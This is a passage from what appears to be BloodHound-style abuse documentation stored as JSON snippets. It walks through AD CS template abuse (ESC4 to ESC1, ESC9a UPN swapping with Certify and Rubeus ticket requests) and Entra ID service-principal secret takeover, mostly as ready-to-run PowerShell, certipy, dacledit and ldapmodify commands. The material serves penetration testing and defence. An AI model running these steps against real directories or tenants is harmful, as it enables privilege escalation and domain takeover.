            "$acl.RemoveAccessRuleSpecific($ace)",
            "$template.psbase.CommitChanges()",
            "```",
            "#### Linux",
            "Impacket's dacledit can be used for that purpose:",
            "```bash",
            "dacledit.py -action 'write' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'",
            "```",
            "Confirm that the GenericAll ACE was added:",
            "```bash",
            "dacledit.py -action 'read' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'",
            "```",
            "After abuse, remove the GenericAll ACE you added:",
            "```bash",
            "dacledit.py -action 'remove' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'",
            "```",
            "### Step 0.3: Make certificate template ESC1 abusable (Linux only)",
            "If you have an GenericAll edge to the CertTemplate node, or if you have just granted yourself GenericAll, then you can use this step from a Linux host to make the template abuseable to ESC1 using Certipy.",
            "If you do not have GenericAll on the CertTemplate or if you are operation from a Windows host, continue to the next step.",
            "Overwrite the configuration of the certificate template to make it vulnerable to ESC1:",
            "```bash",
            "certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old",
            "```",
            "The -save-old parameter is used to save the old configuration, which is used afterward for restoring the configuration:",
            "```bash",
            "certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json",
            "```",
            "Restoring the configuration is vital as the vulnerable configuration grants Full Control to Authenticated Users.",
            "The certificate template is now vulnerable to the ESC1 technique. See [ADCSESC1](/resources/edges/adcs-esc1) for instructions.",
            "### Step 1: Ensure the certificate template allows for client authentication",
            "The certificate template allows for client authentication if the CertTemplate node's Authentication Enabled (authenticationenabled) is set to True. In that case, continue to the next step.",
            "#### Windows",
            "Use the following PowerShell snippet to check the values of the pKIExtendedKeyUsage and msPKI-Certificate-Application-Policy attributes of the certificate template:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$ldapPath = \"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "$ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)",
            "$searcher = New-Object DirectoryServices.DirectorySearcher",
            "$searcher.SearchRoot = $ldap",
            "$searcher.Filter = \"(&(objectClass=pKICertificateTemplate)(cn=$templateName))\"",
            "$template = $searcher.FindOne().GetDirectoryEntry()",
            "# Print attributes",
            "Write-Host \"pKIExtendedKeyUsage: $($template.Properties[\"pKIExtendedKeyUsage\"])\"",
            "Write-Host \"msPKI-Certificate-Application-Policy: $($template.Pro",
            "To run the LDAP query as another principal, replace DirectoryEntry($ldapPath) with DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword) to specify the credentials of the principal.",
            "```",
            "Add the Client Authentication EKU:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "$eku = \"1.3.6.1.5.5.7.3.2\" # Client Authentication EKU",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$ldapPath = \"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "$ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)",
            "$searcher = New-Object DirectoryServices.DirectorySearcher",
            "$searcher.SearchRoot = $ldap",
            "$searcher.Filter = \"(&(objectClass=pKICertificateTemplate)(cn=$templateName))\"",
            "$template = $searcher.FindOne().GetDirectoryEntry()",
            "# Add EKU to attributes",
            "$template.Properties[\"pKIExtendedKeyUsage\"].Add($eku) | Out-Null",
            "$template.Properties[\"msPKI-Certificate-Application-Policy\"].Add($eku) | Out-Null",
            "$template.CommitChanges()",
            "$ldap.Close()",
            "```",
            "Run the first PowerShell snippet again to confirm the EKU has been added.",
            "After abuse, remove the Client Authentication EKU:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "$eku = \"1.3.6.1.5.5.7.3.2\" # Client Authentication EKU",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$ldapPath = \"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "$ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)",
            "$searcher = New-Object DirectoryServices.DirectorySearcher",
            "$searcher.SearchRoot = $ldap",
            "$searcher.Filter = \"(&(objectClass=pKICertificateTemplate)(cn=$templateName))\"",
            "$template = $searcher.FindOne().GetDirectoryEntry()",
            "# Remove EKU from attributes",
            "$template.Properties[\"pKIExtendedKeyUsage\"].Remove($eku) | Out-Null",
            "$template.Properties[\"msPKI-Certificate-Application-Policy\"].Remove($eku) | Out-Null",
            "$template.CommitChanges()",
            "$ldap.Close()",
            "```",
            "Verify the EKU has been removed using the first PowerShell snippet.",
            "#### Linux",
            "Check the current value of the msPKI-Certificate-Application-Policy and pKIExtendedKeyUsage attribute on the certificate template using ldapsearch and note it down for later:",
            "```bash",
            "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"TEMPLATE-DN\" msPKI-Certificate-Application-Policy",
            "```",
            "```bash",
            "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"TEMPLATE-DN\" pKIExtendedKeyUsage",
            "```",
            "Set the Client Authentication EKU using ldapmodify:",
            "```bash",
            "echo -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Certificate-Application-Policy\\nmsPKI-Certificate-Application-Policy: 1.3.6.1.5.5.7.3.2\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "```bash",
            "echo -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: pKIExtendedKeyUsage\\npKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "Run the first two command again to confirm the attributes have been set.",
            "After abuse, set the attributes back to the original value by running the commands to set the values, but with the original values instead. To set multiple EKUs, use this format:",
            "```bash",
            "echo -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: ATTRIBUTE\\nATTRIBUTE: EKU1\\nATTRIBUTE: EKU2\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "### Step 2: Ensure the certificate template requires enrollee to specify Subject Alternative Name (SAN)",
            "The certificate template requires the enrollee to specify SAN if the CertTemplate node's Enrollee Supplies Subject (enrolleesuppliessubject) is set to True. In that case, continue to the next step.",
            "The certificate template requires the enrollee to specify SAN if the CT\\_FLAG\\_ENROLLEE\\_SUPPLIES\\_SUBJECT flag is enabled in the certificate template's msPKI-Certificate-Name-Flag attribute.",
            "#### Windows",
            "Use the following PowerShell snippet to check the value of the msPKI-Certificate-Name-Flag attribute of the certificate template and its enabled flags:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$ldapPath = \"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "$ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)",
            "$searcher = New-Object DirectoryServices.DirectorySearcher",
            "$searcher.SearchRoot = $ldap",
            "$searcher.Filter = \"(&(objectClass=pKICertificateTemplate)(cn=$templateName))\"",
            "$template = $searcher.FindOne().GetDirectoryEntry()",
            "$msPKICertificateNameFlag = $template.Properties[\"msPKI-Certificate-Name-Flag\"]",
            "$ldap.Close()",
            "# Print attribute value and enabeld flags",
            "$flagTable = @{",
            "0x00000001 = \"CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT\"",
            "0x00010000 = \"CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME\"",
            "0x00400000 = \"CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS\"",
            "0x00800000 = \"CT_FLAG_SUBJECT_ALT_REQUIRE_SPN\"",
            "0x01000000 = \"CT_FLAG_SUBJECT_ALT_REQUIRE_DIRECTORY_GUID\"",
            "0x02000000 = \"CT_FLAG_SUBJECT_ALT_REQUIRE_UPN\"",
            "0x04000000 = \"CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL\"",
            "0x08000000 = \"CT_FLAG_SUBJECT_ALT_REQUIRE_DNS\"",
            "0x10000000 = \"CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN\"",
            "0x20000000 = \"CT_FLAG_SUBJECT_REQUIRE_EMAIL\"",
            "0x40000000 = \"CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME\"",
            "0x80000000 = \"CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH\"",
            "0x00000008 = \"CT_FLAG_OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME\"",
            "}",
            "Write-Host \"msPKI-Certificate-Name-Flag: $msPKICertificateNameFlag\"",
            "foreach ($flag in $flagTable.Keys) {",
            "if ($msPKICertificateNameFlag.ToString() -band $flag) {",
            "Write-Host \"0x$(\"{0:X8}\" -f $flag) $($flagTable[$flag])\"",
            "}",
            "}",
            "```",
            "Flip the CT\\_FLAG\\_ENROLLEE\\_SUPPLIES\\_SUBJECT flag:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "$flagToFlip = 0x00000001 # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$ldapPath = \"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "$ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)",
            "$searcher = New-Object DirectoryServices.DirectorySearcher",
            "$searcher.SearchRoot = $ldap",
            "$searcher.Filter = \"(&(objectClass=pKICertificateTemplate)(cn=$templateName))\"",
            "$template = $searcher.FindOne().GetDirectoryEntry()",
            "# Flip flag",
            "$curValue = $template.Properties[\"msPKI-Certificate-Name-Flag\"].Value",
            "$template.Properties[\"msPKI-Certificate-Name-Flag\"].Value = $curValue -bxor $flagToFlip",
            "$template.CommitChanges()",
            "$ldap.Close()",
            "```",
            "To run the LDAP query as another principal, replace DirectoryEntry($ldapPath) with DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword) to specify the credentials of the principal.",
            "Run the first PowerShell snippet again to confirm the CT\\_FLAG\\_ENROLLEE\\_SUPPLIES\\_SUBJECT flag has been enabled.",
            "After abuse, remove the flag by running the script that flips the flag once again.",
            "#### Linux",
            "Check the current value of the msPKI-Certificate-Name-Flag attribute on the certificate template using ldapsearch and note it down for later:",
            "```bash",
            "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"TEMPLATE-DN\" msPKI-Certificate-Name-Flag",
            "```",
            "Set the CT\\_FLAG\\_ENROLLEE\\_SUPPLIES\\_SUBJECT flag as the only enabled flag using ldapmodify:",
            "```bash",
            "echo -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Certificate-Name-Flag\\nmsPKI-Certificate-Name-Flag: 1\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "Run the first command again to confirm the attribute has been set.",
            "After abuse, set the attribute back to the original value by running the command that sets the value, but with the original value instead of 1.",
            "### Step 3: Ensure the certificate template does not require manager approval",
            "The certificate template does not require manager approval if the CertTemplate node's Requires Manager Approval (requiresmanagerapproval) is set to False. In that case, continue to the next step.",
            "The certificate template requires manager approval if the CT\\_FLAG\\_PEND\\_ALL\\_REQUESTS flag is enabled in the certificate template's msPKI-Enrollment-Flag attribute.",
            "#### Windows",
            "Use the following PowerShell snippet to check the value of the msPKI-Enrollment-Flag attribute of the certificate template and its enabled flags:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$ldapPath = \"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "$ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)",
            "$searcher = New-Object DirectoryServices.DirectorySearcher",
            "$searcher.SearchRoot = $ldap",
            "$searcher.Filter = \"(&(objectClass=pKICertificateTemplate)(cn=$templateName))\"",
            "$template = $searcher.FindOne().GetDirectoryEntry()",
            "$msPKICertificateNameFlag = $template.Properties[\"msPKI-Enrollment-Flag\"]",
            "$ldap.Close()",
            "# Print attribute value and enabeld flags",
            "$flagTable = @{",
            "0x00000001 = \"CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS\"",
            "0x00000002 = \"CT_FLAG_PEND_ALL_REQUESTS\"",
            "0x00000004 = \"CT_FLAG_PUBLISH_TO_KRA_CONTAINER\"",
            "0x00000008 = \"CT_FLAG_PUBLISH_TO_DS\"",
            "0x00000010 = \"CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE\"",
            "0x00000020 = \"CT_FLAG_AUTO_ENROLLMENT\"",
            "0x00000040 = \"CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT\"",
            "0x00000100 = \"CT_FLAG_USER_INTERACTION_REQUIRED\"",
            "0x00000400 = \"CT_FLAG_REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE\"",
            "0x00000800 = \"CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF\"",
            "0x00001000 = \"CT_FLAG_ADD_OCSP_NOCHECK\"",
            "0x00002000 = \"CT_FLAG_ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL\"",
            "0x00004000 = \"CT_FLAG_NOREVOCATIONINFOINISSUEDCERTS\"",
            "0x00008000 = \"CT_FLAG_INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS\"",
            "0x00010000 = \"CT_FLAG_ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT\"",
            "0x00020000 = \"CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST\"",
            "0x00040000 = \"CT_FLAG_SKIP_AUTO_RENEWAL\"",
            "0x00080000 = \"CT_FLAG_NO_SECURITY_EXTENSION\"",
            "}",
            "Write-Host \"msPKI-Certificate-Name-Flag: $msPKICertificateNameFlag\"",
            "foreach ($flag in $flagTable.Keys) {",
            "if ($msPKICertificateNameFlag.ToString() -band $flag) {",
            "Write-Host \"0x$(\"{0:X8}\" -f $flag) $($flagTable[$flag])\"",
            "}",
            "}",
            "```",
            "Flip the CT\\_FLAG\\_PEND\\_ALL\\_REQUESTS flag:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "$flagToFlip = 0x00000002 # CT_FLAG_PEND_ALL_REQUESTS",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$ldapPath = \"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "$ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)",
            "$searcher = New-Object DirectoryServices.DirectorySearcher",
            "$searcher.SearchRoot = $ldap",
            "$searcher.Filter = \"(&(objectClass=pKICertificateTemplate)(cn=$templateName))\"",
            "$template = $searcher.FindOne().GetDirectoryEntry()",
            "# Flip flag",
            "$curValue = $template.Properties[\"msPKI-Enrollment-Flag\"].Value",
            "$template.Properties[\"msPKI-Enrollment-Flag\"].Value = $curValue -bxor $flagToFlip",
            "$template.CommitChanges()",
            "$ldap.Close()",
            "```",
            "To run the LDAP query as another principal, replace DirectoryEntry($ldapPath) with DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword) to specify the credentials of the principal.",
            "Run the first PowerShell snippet again to confirm the CT\\_FLAG\\_PEND\\_ALL\\_REQUESTS flag has been enabled.",
            "After abuse, remove the flag by running the script that flips the flag once again.",
            "#### Linux",
            "Check the current value of the msPKI-Enrollment-Flag attribute on the certificate template using ldapsearch and note it down for later:",
            "```bash",
            "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"TEMPLATE-DN\" msPKI-Enrollment-Flag",
            "```",
            "Remove all flags from msPKI-Enrollment-Flag using ldapmodify:",
            "```bash",
            "echo -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Enrollment-Flag\\nmsPKI-Enrollment-Flag: 0\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "Run the first command again to confirm the attribute has been set.",
            "After abuse, set the attribute back to the original value by running the command to set the value, but with the original value instead of 0.",
            "### Step 4: Ensure the certificate template does not require authorized signatures",
            "The certificate template does not require authorized signatures if the CertTemplate node's Authorized Signatures Required (authorizedsignatures) is set to 0 or if the Schema Version (schemaversion) is 1. In that case, continue to the next step.",
            "The certificate template requires authorized signatures if the certificate template's msPKI-RA-Signature attribute value is more than zero.",
            "#### Windows",
            "Use the following PowerShell snippet to check the value of the msPKI-RA-Signature attribute:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$ldapPath = \"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "$ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)",
            "$searcher = New-Object DirectoryServices.DirectorySearcher",
            "$searcher.SearchRoot = $ldap",
            "$searcher.Filter = \"(&(objectClass=pKICertificateTemplate)(cn=$templateName))\"",
            "$template = $searcher.FindOne().GetDirectoryEntry()",
            "# Print attribute",
            "Write-Host \"msPKI-RA-Signature: $($template.Properties[\"msPKI-RA-Signature\"])\"",
            "$ldap.Close()",
            "```",
            "Set msPKI-RA-Signature to 0:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "$noSignatures = [Int32]0",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$ldapPath = \"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "$ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)",
            "$searcher = New-Object DirectoryServices.DirectorySearcher",
            "$searcher.SearchRoot = $ldap",
            "$searcher.Filter = \"(&(objectClass=pKICertificateTemplate)(cn=$templateName))\"",
            "$template = $searcher.FindOne().GetDirectoryEntry()",
            "# Set No. of authorized signatures required",
            "$template.Properties[\"msPKI-RA-Signature\"].Value = $noSignatures",
            "$template.CommitChanges()",
            "$ldap.Close()",
            "```",
            "To run the LDAP query as another principal, replace DirectoryEntry($ldapPath) with DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword) to specify the credentials of the principal.",
            "Run the first PowerShell snippet again to confirm the msPKI-RA-Signature attribute has been set.",
            "After abuse, set the msPKI-RA-Signature attribute back to the original value by running PowerShell snippet that sets the value, but with the original value instead of 0.",
            "#### Linux",
            "Check the current value of the msPKI-RA-Signature attribute on the certificate template using ldapsearch and note it down for later:",
            "```bash",
            "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"TEMPLATE-DN\" msPKI-RA-Signature",
            "```",
            "Remove all flags from msPKI-RA-Signature using ldapmodify:",
            "```bash",
            "echo -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-RA-Signature\\nmsPKI-RA-Signature: 0\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "Run the first command again to confirm the attribute has been set.",
            "After abuse, set the attribute back to the original value by running the command that sets the value, but with the original value instead of 0.",
            "### Step 5: Ensure the principal has enrollment rights on the certificate template",
            "The principal does have enrollment rights on the certificate template if BloodHound returns a path for this Cypher query (replace \"PRINCIPAL@DOMAIN.NAME\" and \"CERTTEMPLATE@DOMAIN.NAME\" with the names of the principal and the certificate template):",
            "```bash",
            "MATCH p = (x)-[:MemberOf*0..]->()-[:Enroll|AllExtendRights|GenericAll]->(ct:CertTemplate)",
            "WHERE x.name = \"PRINCIPAL@DOMAIN.NAME\" AND ct.name = \"CERTTEMPLATE@DOMAIN.NAME\"",
            "RETURN p",
            "```",
            "If a path is returned, continue to the next step.",
            "#### Windows",
            "Use the following PowerShell snippet to grant the principal Enroll on the certificate template:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "$principalName = \"principal\" # SAM account name of principal",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$template = [ADSI]\"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "# Construct the ACE",
            "$objectTypeByteArray = [GUID]\"0e10c968-78fb-11d2-90d4-00c04f79dc55\"",
            "$inheritedObjectTypeByteArray = [GUID]\"00000000-0000-0000-0000-000000000000\"",
            "$account = New-Object System.Security.Principal.NTAccount($principalName)",
            "$sid = $account.Translate([System.Security.Principal.SecurityIdentifier])",
            "$ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(",
            "$sid,",
            "[System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,",
            "[System.Security.AccessControl.AccessControlType]::Allow,",
            "$objectTypeByteArray,",
            "[System.Security.AccessControl.InheritanceFlags]::None,",
            "$inheritedObjectTypeByteArray",
            ")",
            "# Add the new ACE to the ACL",
            "$acl = $template.psbase.ObjectSecurity",
            "$acl.AddAccessRule($ace)",
            "$template.psbase.CommitChanges()",
            "```",
            "Confirm that the Enroll ACE was added:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "$principalName = \"principal\" # SAM account name of principal",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$template = [ADSI]\"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "# Print ACEs granted to the principal",
            "$acl = $template.psbase.ObjectSecurity",
            "$acl.Access | ? { $_.IdentityReference -like \"*$principalName\" }",
            "```",
            "After abuse, remove the Enroll ACE you added:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "$principalName = \"principal\" # SAM account name of principal",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$template = [ADSI]\"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "# Construct the ACE",
            "$objectTypeByteArray = [GUID]\"0e10c968-78fb-11d2-90d4-00c04f79dc55\"",
            "$inheritedObjectTypeByteArray = [GUID]\"00000000-0000-0000-0000-000000000000\"",
            "$account = New-Object System.Security.Principal.NTAccount($principalName)",
            "$sid = $account.Translate([System.Security.Principal.SecurityIdentifier])",
            "$ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(",
            "$sid,",
            "[System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,",
            "[System.Security.AccessControl.AccessControlType]::Allow,",
            "$objectTypeByteArray,",
            "[System.Security.AccessControl.InheritanceFlags]::None,",
            "$inheritedObjectTypeByteArray",
            ")",
            "# Remove the ACE from the ACL",
            "$acl = $template.psbase.ObjectSecurity",
            "$acl.RemoveAccessRuleSpecific($ace)",
            "$template.psbase.CommitChanges()",
            "```",
            "The principal can now perform an ESC1 attack.",
            "### Step 6: Perform ESC1 attack",
            "See [ADCSESC1](/resources/edges/adcs-esc1) for instructions."
        ]
    },
    "AZMGAddSecret": {
        "prefix": "AZMGAddSecret",
        "description": "This edge is created during post-processing.",
        "body": [
            "There are several ways to perform this abuse, depending on what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the “Certificates & secrets” tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API. No matter what kind of control you have, you will be able to perform this abuse by using BARK’s New-EntraAppSecret or New-ServicePrincipalSecret functions.",
            "These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add secrets to the target object. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:",
            "```bash",
            "$MGToken = Get-MSGraphTokenWithClientCredentials `",
            "    -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `",
            "    -ClientSecret \"asdf...\" `",
            "    -TenantName \"contoso.onmicrosoft.com\"",
            "```",
            "Then use BARK’s New-EntraAppSecret to add a new secret to the target application:",
            "```bash",
            "New-EntraAppSecret `",
            "    -AppRegObjectID \"d878...\" `",
            "    -Token $MGToken.access_token",
            "```",
            "The output will contain the plain-text secret you just created for the target app:",
            "```bash",
            "New-EntraAppSecret `",
            "    -AppRegObjectID \"d878...\" `",
            "    -Token $MGToken.access_token",
            "Name                Value",
            "----                -----",
            "AppRegSecretValue   odg8Q~...",
            "AppRegAppId         4d31...",
            "AppRegObjectId      d878...",
            "```",
            "With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK’s Get-MSGraphToken function:",
            "```bash",
            "$SPToken = Get-MSGraphToken `",
            "    -ClientID \"4d31...\" `",
            "    -ClientSecret \"odg8Q~...\" `",
            "    -TenantName \"contoso.onmicrosoft.com\"",
            "```",
            "Now you can use this JWT to perform actions against any other MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal."
        ]
    },
    "AZPrivilegedRoleAdmin": {
        "prefix": "AZPrivilegedRoleAdmin",
        "description": "The Privileged Role Admin role can grant any other admin role to another principal at the tenant level.",
        "body": [
            "Activate the Global Admin role for yourself or for another user using PowerZure or PowerShell."
        ]
    },
    "ADCSESC9a": {
        "prefix": "ADCSESC9a",
        "description": "The principal has control over a victim principal with permission to enroll on one or more certificate templates, configured to: 1) enable certificate authentication, 2) require the `userPrincipalName` (UPN) of the enrollee included in the Subject Alternative Name (SAN), and 3) do not have the security extension enabled.",
        "body": [
            "### Windows",
            "Step 1: Set UPN of victim to targeted principal's `sAMAccountName`. Set the UPN of the victim principal using PowerView:",
            "```bash",
            "Set-DomainObject -Identity VICTIM -Set @{'userprincipalname'='Target'}",
            "```",
            "Step 2: Check if the 'mail' attribute of victim must be set and set it if required.",
            "If the certificate template is of schema version 2 or above, and its attribute 'msPKI-CertificateNameFlag' contains the flag SUBJECT\\_REQUIRE\\_EMAIL and/or SUBJECT\\_ALT\\_REQUIRE_EMAIL, then the victim principal must have their mail attribute set for the certificate enrollment. The CertTemplate BloodHound node will have \"Subject Require Email\" or \"Subject Alternative Name Require Email\" set to true if any of the flags are present.",
            "If the certificate template is of schema version 1 or does not have any of the email flags, then",
            "continue to Step 3.",
            "If any of the two flags are present, you will need the victim's mail attribute to be set. The value of",
            "the attribute will be included in the issues certificate but it is not used to identify the target",
            "principal why it can be set to any arbitrary string.",
            "Check if the victim has the mail attribute set using PowerView:",
            "```bash",
            "Get-DomainObject -Identity VICTIM -Properties mail",
            "```",
            "If the victim has the mail attribute set, continue to Step 3.",
            "If the victim does not has the mail attribute set, set it to a dummy mail using PowerView:",
            "```bash",
            "Set-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}",
            "```",
            "Step 3: Obtain a session as victim. There are several options for this step.",
            "If the victim is a computer, you can obtain the credentials of the computer account using the Shadow",
            "Credentials attack (see [AddKeyCredentialLink edge](/resources/edges/add-key-credential-link) documentation).",
            "Alternatively, you can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see [GenericAll edge](/resources/edges/generic-all) documentation).",
            "If the victim is a user, you have the following options for obtaining the credentials:",
            "* Shadow Credentials attack (see [AddKeyCredentialLink edge](/resources/edges/add-key-credential-link) documentation).",
            "* Password reset (see [ForceChangePassword edge](/resources/edges/force-change-password) documentation).",
            "* Targeted Kerberoasting (see [WriteSPN edge](/resources/edges/write-spn) documentation).",
            "Step 4: Enroll certificate as victim.",
            "Use Certify as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:",
            "```bash",
            "Certify.exe request /ca:SERVER\\CA-NAME /template:TEMPLATE",
            "```",
            "Save the certificate as `cert.pem` and the private key as `cert.key`.",
            "Step 5: Convert the emitted certificate to PFX format:",
            "```bash",
            "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
            "```",
            "Step 6: Set UPN of victim to arbitrary value.",
            "Set the UPN of the victim principal using PowerView:",
            "```bash",
            "Set-DomainObject -Identity VICTIM -Set @{'userprincipalname'='victim@corp.local'}",
            "```",
            "Step 7: Perform Kerberos authentication as targeted principal against affected DC using certificate.",
            "Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the",
            "target identity to impersonate and the PFX-formatted certificate created in Step 5:",
            "```bash",
            ".\\Rubeus.exe asktgt /certificate:cert.pfx /user:forestrootda /domain:forestroot.com /ptt",
            "```",
            "### Linux",
            "Step 1: Set UPN of victim to targeted principal's `sAMAccountName`. Set the UPN of the victim principal using Certipy:",
            "```bash",
            "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -upn Target",
            "```",
